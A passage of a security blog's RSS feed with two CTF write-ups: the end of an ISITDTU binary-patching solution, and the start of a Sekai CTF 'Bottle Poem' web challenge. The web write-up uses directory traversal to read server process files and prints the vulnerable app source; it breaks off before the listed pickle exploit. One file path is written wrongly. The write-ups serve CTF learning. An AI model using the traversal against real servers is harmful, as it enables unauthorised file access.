+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">77&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">26&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">66&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">63&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v2&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_401D50&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">Buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">55&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_401160&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">30&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">Buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">v4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">Buffer&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">v4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">sub_401040&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;flag is: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">v2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function receives our modified variable &lt;strong>Block&lt;/strong>, then uses it to produce our flag.&lt;/p>
+&lt;h2 id="reaching-case-1">Reaching case 1&lt;/h2>
+&lt;p>Here is where things get interesting. Take a look at the function &lt;strong>sub_401110(v26, v22)&lt;/strong>, we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">sub_401110&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">a2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">v3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+0h] [ebp-4h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">sub_4010F0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">Sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1000&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">Sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1000&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">sub_4010F0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">v3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The algorithm here is very simple, however this is author&amp;rsquo;s idea to let the program sleeps for a total of &lt;strong>(a1 + a2) seconds&lt;/strong> each time this function is called. The intended result of this function is to &lt;strong>return a1 + a2&lt;/strong>. We will have to patch the binary to get our flag.&lt;/p>
+&lt;h2 id="patch-the-binary">Patch the binary&lt;/h2>
+&lt;p>So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mov ecx, [ebp+arg_0]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov edx, [ecx+10h]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sub edx, 1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov eax, [ebp+arg_0]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov [eax+10h], edx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov ecx, [ebp+var_10]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">push ecx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov edx, [ebp+var_C]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">push edx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">call sub_401110
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">add esp, 8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov [ebp+var_58], eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mov eax, [ebp+arg_0]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Instead of calling &lt;strong>sub_401110&lt;/strong>, we should patch the program to directly calculates &lt;strong>ecx + edx&lt;/strong> then assigns it into &lt;strong>eax&lt;/strong>. We find out that the opcode of &lt;strong>call sub_401110&lt;/strong> is &lt;strong>E8 77 FC FF FF&lt;/strong>.&lt;/p>
+&lt;p>Using &lt;strong>IDA Pro&lt;/strong> integrated settings, which can be found at &lt;strong>Options &amp;gt; Generals &amp;gt; Number of Opcode bytes (non-graph) set to a large enough number&lt;/strong>, we can view each instruction&amp;rsquo;s opcode.&lt;/p>
+&lt;p>With &lt;a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools&lt;/a> library, we also find out the opcode for &lt;strong>add ecx, edx&lt;/strong> and &lt;strong>move eax, ecx&lt;/strong> is &lt;strong>01 D1&lt;/strong> and &lt;strong>89 C8&lt;/strong> using this script written in &lt;strong>Python&lt;/strong> below.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;add ecx, edx&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;mov eax, ecx&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is now time to patch the binary. Use any hex editor of your choice to patch the binary, here I use &lt;strong>IDA Pro&lt;/strong>&amp;rsquo;s integrated &lt;strong>hex view&lt;/strong> to patch the binary.&lt;/p>
+&lt;p>Change &lt;strong>E8 77 FC FF FF&lt;/strong> to &lt;strong>01 D1 89 C8 90&lt;/strong> using any hex editor of your choice (here &lt;strong>90&lt;/strong> corresponds to the &lt;strong>NOP&lt;/strong> instruction).&lt;/p>
+&lt;h2 id="result">Result&lt;/h2>
+&lt;p>After patching the binary, run it again to get our flag.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">fazect@LAPTOP-CQA118DI:/mnt/d/Downloads$ ./slow.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RESULT: 75025
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag is: Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Wrap the flag with &lt;strong>ISITDTU{}&lt;/strong>, we have our flag for the challenge: &lt;strong>ISITDTU{Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1}&lt;/strong>.&lt;/p></description></item><item><title>Sekai CTF 2022 Bottle Poem</title><link>https://blog.bkisc.com/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/</link><pubDate>Thu, 12 Jan 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
+&lt;nav id="TableOfContents">
+&lt;ul>
+&lt;li>&lt;a href="#problem-statement">Problem statement&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#basic">Basic&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#python-bottle">Python Bottle&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#pickle-exploit">Pickle exploit&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="#the-exercise-step">The exercise step&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#generate-cookie">Generate cookie&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="#reference-links">Reference Links&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/nav>
+&lt;/details>
+&lt;h2 id="problem-statement">Problem statement&lt;/h2>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_4a91ca17c18ee2bcef6f40a16a68a5d7.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_6e7d8f85bb5a3496f13d0e2fa954f40d.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_4a91ca17c18ee2bcef6f40a16a68a5d7.webp"
+width="760"
+height="271"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+Author hints that flag is executable&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_1ac92203911ee32374b5c8cfdf92f1e3.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_3db95823c489131849b41bad6f56f91c.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_1ac92203911ee32374b5c8cfdf92f1e3.webp"
+width="760"
+height="317"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_367f0777060e97e8f182d318fe9db5a5.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_ea86b6e74991cb6029b0ace1e78dfe6b.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_367f0777060e97e8f182d318fe9db5a5.webp"
+width="760"
+height="317"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>The website is vulnerable to directory traversal
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_fc0c13ac486926b237705909fb5674c9.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_f6f697f8a4c4f331ede31d4ada1d842d.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_fc0c13ac486926b237705909fb5674c9.webp"
+width="760"
+height="317"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Pick /etc/self/procline to get the start application command
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_3b5b0446a4ac798eff2f398ab9afa3f0.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_28ca4e36b8cfd5f0f62981ba13e29fa6.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_3b5b0446a4ac798eff2f398ab9afa3f0.webp"
+width="760"
+height="317"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_0d72305cb6524bd08f21aba767f58f28.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp"
+width="760"
+height="89"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>So the application source is located at /app/app.py
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_0d72305cb6524bd08f21aba767f58f28.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp"
+width="760"
+height="89"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_16ad39f60335557edc36537a3cac697b.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_e688dff2097a57abe2efb1bf3dc20dad.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_16ad39f60335557edc36537a3cac697b.webp"
+width="760"
+height="234"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">bottle&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">route&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">run&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">config.secret&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">sekai&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">re&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">home&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;index&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/show&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;text/plain; charset=UTF-8&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">param&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">re&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;^../app&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;No!!!!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">requested_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getcwd&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;/poems&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">requested_path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tfile&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;No This Poems&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">tfile&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">404&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">error404&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;error&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/sign&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
